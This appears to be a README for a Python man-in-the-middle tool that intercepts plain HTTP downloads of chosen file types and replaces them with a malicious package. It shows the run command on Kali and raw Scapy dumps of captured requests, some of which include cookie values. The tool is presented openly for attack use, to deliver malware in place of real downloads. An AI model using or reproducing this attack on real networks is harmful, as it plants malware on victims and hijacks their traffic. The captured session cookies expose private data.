## MitM attack manage packages

    At this moment, the module only work under https layer, not for encrypted connections https.
    by default, the prcessor looking for raw packages for request and responses with a choosen extensions.
    ie: ".zip, .pdf, .txt, .exe"
    On response for request we have an oportuninty to replace the content with a malicious package.
     
# Run attack 

   Example over extension files ".png" images:
   
   
   root@kali:~/PycharmProjects/mitm_process.py# python replace_downlad.py 







    [+] donwload png file Request
    ###[ IP ]### 
      version   = 4
      ihl       = 5
      tos       = 0x0
      len       = 607
      id        = 56481
      flags     = DF
      frag      = 0
      ttl       = 64
      proto     = tcp
      chksum    = 0x8b8f
      src       = 10.0.2.15
      dst       = 23.101.172.244
      \options   \
    ###[ TCP ]### 
         sport     = 34320
         dport     = http
         seq       = 640728776
         ack       = 244754
         dataofs   = 5
         reserved  = 0
         flags     = PA
         window    = 63712
         chksum    = 0xd3cf
         urgptr    = 0
         options   = []
    ###[ Raw ]### 
            load      = 'GET /images/header-stars.png HTTP/1.1\r\nHost: www.vorlonjs.io\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\nAccept: image/webp,*/*\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://www.vorlonjs.io/css/main.css\r\nConnection: keep-alive\r\nCookie: _ga=GA1.2.691487594.1589563688; _gid=GA1.2.902708087.1589563688; ARRAffinity=5f6a84feb0f432414866a8390327b4f7cc30bdcffa70f8c37512930b34042f07\r\nIf-Modified-Since: Wed, 06 May 2015 15:08:32 GMT\r\nIf-None-Match: "51213084e88d01:0"\r\nCache-Control: max-age=0\r\n\r\n'
    
    None
    [+] donwload png file Request
    ###[ IP ]### 
      version   = 4
      ihl       = 5
      tos       = 0x0
      len       = 615
      id        = 53206
      flags     = DF
      frag      = 0
      ttl       = 64
      proto     = tcp
      chksum    = 0x9852
      src       = 10.0.2.15
 